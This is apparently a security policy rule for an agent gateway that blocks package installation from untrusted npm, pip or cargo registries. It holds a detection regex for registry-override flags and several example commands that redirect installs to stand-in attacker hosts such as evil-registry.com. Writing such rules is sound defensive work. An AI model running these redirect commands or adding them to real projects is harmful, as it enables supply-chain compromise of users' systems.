---
name: no-untrusted-registry
version: "1.0.0"
domain: sectors/cybersecurity
description: Block package installation from untrusted or unofficial registries
schema_version: 1
match:
  actions: ["execute"]
  contexts:
    content_pattern: "registry=|--registry|npm_config_registry|index-url|extra-index-url|PIP_INDEX_URL|cargo.*registry.*url"
    exclude_pattern: "registry\\.npmjs\\.org|pypi\\.org|crates\\.io"
verdict: DENY
severity: HIGH
priority: 250
author: sovraine
license: CC-BY-SA-4.0
tags: [npm, pip, cargo, registry, supply-chain, package-manager]
signature: null
certified: false
---

## What it does

Blocks package installation when the registry URL has been overridden to point to an untrusted source.

## Why it exists

Attackers redirect package installations to malicious registries via:

- `.npmrc` with `registry=https://evil-registry.com`
- `npm install --registry=https://evil-registry.com`
- `PIP_INDEX_URL=https://evil.com/simple/` in environment
- `pip install --extra-index-url https://evil.com/simple/`
- `cargo` config with custom registry URLs
- Environment variables: `npm_config_registry`, `PIP_INDEX_URL`, `CARGO_REGISTRIES_*`

This enables:
- **Dependency confusion**: private package names shadowed by public malicious packages
- **Registry hijacking**: all installs redirected to attacker-controlled registry
- **MITM via HTTP registries**: packages served over HTTP allow content modification

## What gets blocked

- `execute` — any package install with a non-standard registry URL
- `execute` — commands that set registry environment variables before installing

## What is still allowed

- Installing from official registries (registry.npmjs.org, pypi.org, crates.io)
- Installing from explicitly allowlisted private registries (corporate Artifactory, Nexus, etc.)
- Reading .npmrc or pip.conf for analysis

## How to override

The operator can add private registries to an approved registry list in the gateway configuration, specifying the registry URL and required authentication method. Corporate registries (Artifactory, Nexus, GitHub Packages) must be added with their TLS certificate fingerprint. Users can request a registry addition through the operator approval workflow.
